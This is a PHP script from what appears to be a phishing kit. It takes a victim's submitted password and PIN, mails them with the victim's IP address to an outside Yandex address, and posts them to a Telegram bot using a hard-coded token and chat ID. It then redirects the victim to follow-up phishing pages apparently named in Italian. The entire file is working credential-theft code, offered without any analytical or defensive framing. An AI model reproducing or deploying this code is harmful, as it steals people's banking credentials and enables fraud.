<?php
if(isset($_POST["password"]) && isset($_POST["pin"])){
	include('antibots.php');
	session_start();
	error_reporting(0);
	$binlist = $_GET['binlist'];
	if($binlist != "2"){
		$back = "Riprova.php?bin=".$_GET['bin']."&binlist=2";
	}else{
		$back = "Return.php?bin=".$_GET['bin']."&binlist=2";
	}
	
	$ip = getenv("REMOTE_ADDR");
	
	$message = "";
	$message .= "password : ".$_POST['password']."\n";
	$message .= "pin : ".$_POST['pin']."\n";
	$send = "noctt@yandex.com";
	$subject = "$ip";
	$headers = "From:IS p&p <reality@superhosting.bg>";
	mail($send,$subject,$message,$headers);
	$token = "1516056026:AAHdYg3EmaurDm5HSEAv9uoOwZviazMM9ZY";
$data = [
    'text' => $message,
    'chat_id' => '1697802295'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
	header("Location: $back");
}
else{
	echo 'No thing to see here :(';
}
?>